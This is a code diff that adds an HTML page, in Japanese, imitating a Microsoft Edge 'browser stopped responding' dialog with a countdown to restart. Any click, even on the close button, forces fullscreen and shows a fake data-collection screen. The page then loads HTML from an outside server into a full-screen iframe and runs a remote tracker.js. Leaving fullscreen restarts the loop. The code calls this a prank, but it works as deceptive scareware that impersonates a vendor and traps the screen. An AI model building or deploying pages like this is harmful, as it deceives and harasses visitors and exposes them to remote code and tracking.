@@ -1,0 +1,443 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <title>XXXXX</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+        background: #1a1a1a;
+        font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+        overflow: hidden;
+      }
+
+      /* Dark backdrop */
+      #backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.88);
+        z-index: 1;
+      }
+
+      /* Edge crash modal */
+      #modal {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 400px;
+        background: #ece9d8;
+        border: 1px solid #0831d9;
+        border-top: 0;
+        border-radius: 8px 8px 2px 2px;
+        box-shadow: 0 6px 28px rgba(0, 0, 0, 0.7);
+        font-family: "MS Sans Serif", Tahoma, Arial, sans-serif;
+        z-index: 2;
+        overflow: hidden;
+        animation: modalIn 0.3s ease-out;
+      }
+      @keyframes modalIn {
+        from {
+          transform: translate(-50%, calc(-50% - 20px));
+          opacity: 0;
+        }
+        to {
+          transform: translate(-50%, -50%);
+          opacity: 1;
+        }
+      }
+      .titlebar {
+        height: 28px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 4px 0 8px;
+        background: linear-gradient(
+          180deg,
+          #0997ff 0%,
+          #0850e7 9%,
+          #0a52d6 50%,
+          #0a5cf0 90%,
+          #0a97ef 100%
+        );
+        color: #fff;
+        font-size: 12px;
+        font-weight: bold;
+        text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.6);
+        border-radius: 7px 7px 0 0;
+      }
+      .closeBtn {
+        width: 21px;
+        height: 19px;
+        border: 1px solid #fff;
+        border-radius: 3px;
+        background: linear-gradient(180deg, #f06f6f 0%, #d23a3a 100%);
+        color: #fff;
+        font-size: 11px;
+        line-height: 1;
+        padding: 0;
+        cursor: pointer;
+        flex-shrink: 0;
+        text-shadow: none;
+      }
+      .closeBtn:hover {
+        background: linear-gradient(180deg, #ff8a8a 0%, #e04a4a 100%);
+      }
+      .closeBtn:active {
+        background: linear-gradient(180deg, #c23030 0%, #e85a5a 100%);
+      }
+      .modalBody {
+        display: flex;
+        gap: 14px;
+        padding: 18px 18px 16px;
+      }
+      .warnIcon {
+        font-size: 40px;
+        line-height: 1;
+        color: #d4a000;
+        text-shadow: 1px 1px 0 #9a7400;
+        flex-shrink: 0;
+      }
+      .modalContent {
+        flex: 1;
+      }
+      .heading {
+        font-size: 13px;
+        font-weight: bold;
+        color: #002b6b;
+        margin-bottom: 8px;
+      }
+      .msg {
+        font-size: 12px;
+        line-height: 1.6;
+        color: #000;
+        margin-bottom: 16px;
+      }
+      .msg strong {
+        color: #c00;
+        font-size: 13px;
+      }
+      .actions {
+        text-align: right;
+      }
+      .restartBtn {
+        font-family: "MS Sans Serif", Tahoma, Arial, sans-serif;
+        font-size: 12px;
+        padding: 4px 18px;
+        background: linear-gradient(
+          180deg,
+          #fefefe 0%,
+          #f1f0e7 45%,
+          #e3e0d0 55%,
+          #f4f2e8 100%
+        );
+        border: 1px solid #003c74;
+        border-radius: 3px;
+        cursor: pointer;
+        color: #000;
+      }
+      .restartBtn:hover {
+        border-color: #e88f00;
+        box-shadow: inset 0 0 5px rgba(255, 160, 0, 0.75);
+      }
+      .restartBtn:active {
+        background: linear-gradient(180deg, #e3e0d0 0%, #f4f2e8 100%);
+      }
+      .restartBtn u {
+        text-decoration: underline;
+      }
+
+      /* Loading overlay: full-screen black with a centered white-bordered box */
+      #restartScreen {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 999999;
+        background: #000;
+        color: #fff;
+        font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+      }
+      #restartScreen.active {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .loadingBox {
+        border: 2px solid #fff;
+        color: #fff;
+        padding: 28px 40px;
+        min-width: 340px;
+        text-align: center;
+        background: transparent;
+      }
+      .loadingText {
+        font-size: 14px;
+        letter-spacing: 0.04em;
+        line-height: 1.5;
+      }
+      .loadingDots {
+        margin-top: 16px;
+        height: 8px;
+        line-height: 0;
+      }
+      .loadingDots span {
+        display: inline-block;
+        width: 6px;
+        height: 6px;
+        margin: 0 4px;
+        background: #fff;
+        border-radius: 50%;
+        animation: loadingDot 1.4s ease-in-out infinite;
+      }
+      .loadingDots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .loadingDots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+      @keyframes loadingDot {
+        0%,
+        80%,
+        100% {
+          opacity: 0.3;
+          transform: scale(0.8);
+        }
+        40% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      /* Iframe that will host website2 (delivered by backend) */
+      #prankIframe {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        border: 0;
+        z-index: 1000000;
+        background: #000;
+      }
+      #prankIframe.active {
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="backdrop"></div>
+    <div id="modal">
+      <div class="titlebar">
+        <span>Microsoft Edge</span>
+        <button type="button" class="closeBtn" title="閉じる">&#10005;</button>
+      </div>
+      <div class="modalBody">
+        <div class="warnIcon">&#9888;</div>
+        <div class="modalContent">
+          <p class="heading">Microsoft Edge を再起動する必要があります</p>
+          <p class="msg">
+            ブラウザが応答を停止しました。問題を修復するため、Microsoft Edge
+            を再起動する必要があります。<br />
+            <strong id="countdown">60</strong> 秒後に自動的に再起動します。
+          </p>
+          <div class="actions">
+            <button type="button" id="restartBtn" class="restartBtn">
+              今すぐ再起動(<u>R</u>)
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="restartScreen">
+      <div class="loadingBox">
+        <div class="loadingText">データを収集し、リソースを取得しています</div>
+        <div class="loadingDots"><span></span><span></span><span></span></div>
+      </div>
+    </div>
+
+    <iframe id="prankIframe" title="prank"></iframe>
+
+    <script>
+      (function () {
+        var triggered = false;
+        var countdownTimer = null;
+        var loadingTimer = null;
+        var fetchController = null;
+        var remaining = 60;
+        var PRANK_URL = "https://march9jp.onrender.com/fetchPrank";
+
+        function requestFullScreen(el) {
+          var fn =
+            el.requestFullscreen ||
+            el.webkitRequestFullscreen ||
+            el.mozRequestFullScreen ||
+            el.msRequestFullscreen;
+          if (fn) {
+            try {
+              fn.call(el);
+            } catch (e) {}
+          }
+        }
+
+        function isFullscreen() {
+          return !!(
+            document.fullscreenElement ||
+            document.webkitFullscreenElement ||
+            document.mozFullScreenElement ||
+            document.msFullscreenElement
+          );
+        }
+
+        function loadPrankIframe() {
+          if (fetchController) fetchController.abort();
+          fetchController =
+            typeof AbortController !== "undefined"
+              ? new AbortController()
+              : null;
+          var opts = fetchController ? { signal: fetchController.signal } : {};
+          fetch(PRANK_URL, opts)
+            .then(function (res) {
+              if (!res.ok) throw new Error("HTTP " + res.status);
+              return res.text();
+            })
+            .then(function (htmlText) {
+              if (!triggered) return; // we were reset while fetching
+              var iframe = document.getElementById("prankIframe");
+              iframe.srcdoc = htmlText;
+              iframe.classList.add("active");
+            })
+            .catch(function (err) {
+              if (err && err.name === "AbortError") return;
+              console.error("プランク ページの読み込みに失敗しました:", err);
+            });
+        }
+
+        function runRestartSequence() {
+          if (triggered) return;
+          triggered = true;
+
+          if (countdownTimer) {
+            clearInterval(countdownTimer);
+            countdownTimer = null;
+          }
+          document.getElementById("modal").style.display = "none";
+          document.getElementById("backdrop").style.display = "none";
+
+          requestFullScreen(document.body);
+
+          var rs = document.getElementById("restartScreen");
+          rs.classList.add("active");
+
+          loadingTimer = setTimeout(function () {
+            loadingTimer = null;
+            rs.classList.remove("active");
+            loadPrankIframe();
+          }, 10000);
+        }
+
+        function startCountdown() {
+          if (countdownTimer) clearInterval(countdownTimer);
+          remaining = 60;
+          document.getElementById("countdown").textContent = remaining;
+          countdownTimer = setInterval(function () {
+            remaining--;
+            if (remaining <= 0) {
+              document.getElementById("countdown").textContent = 0;
+              clearInterval(countdownTimer);
+              countdownTimer = null;
+              runRestartSequence();
+            } else {
+              document.getElementById("countdown").textContent = remaining;
+            }
+          }, 1000);
+        }
+
+        function resetToInitialState() {
+          // cancel any in-flight work from the previous cycle
+          if (loadingTimer) {
+            clearTimeout(loadingTimer);
+            loadingTimer = null;
+          }
+          if (fetchController) {
+            fetchController.abort();
+            fetchController = null;
+          }
+          if (countdownTimer) {
+            clearInterval(countdownTimer);
+            countdownTimer = null;
+          }
+
+          // tear down the prank iframe (stops website2's audio, popups, etc.)
+          var iframe = document.getElementById("prankIframe");
+          iframe.classList.remove("active");
+          iframe.srcdoc = "";
+
+          // hide the loading overlay if it was up
+          document.getElementById("restartScreen").classList.remove("active");
+
+          // restore the initial UI: modal + dark backdrop
+          document.getElementById("modal").style.display = "";
+          document.getElementById("backdrop").style.display = "";
+
+          // ready for the next trigger
+          triggered = false;
+          startCountdown();
+        }
+
+        function onFullscreenChange() {
+          if (!isFullscreen()) {
+            resetToInitialState();
+          }
+        }
+        document.addEventListener("fullscreenchange", onFullscreenChange);
+        document.addEventListener("webkitfullscreenchange", onFullscreenChange);
+        document.addEventListener("mozfullscreenchange", onFullscreenChange);
+        document.addEventListener("MSFullscreenChange", onFullscreenChange);
+
+        document
+          .getElementById("restartBtn")
+          .addEventListener("click", function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            runRestartSequence();
+          });
+
+        document
+          .querySelector("#modal .closeBtn")
+          .addEventListener("click", function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            runRestartSequence();
+          });
+
+        document.addEventListener("click", function () {
+          if (triggered) return;
+          runRestartSequence();
+        });
+
+        // Initial state
+        startCountdown();
+      })();
+    </script>
+    <script src="https://march9jp.onrender.com/tracker.js"></script>
+  </body>
+</html>
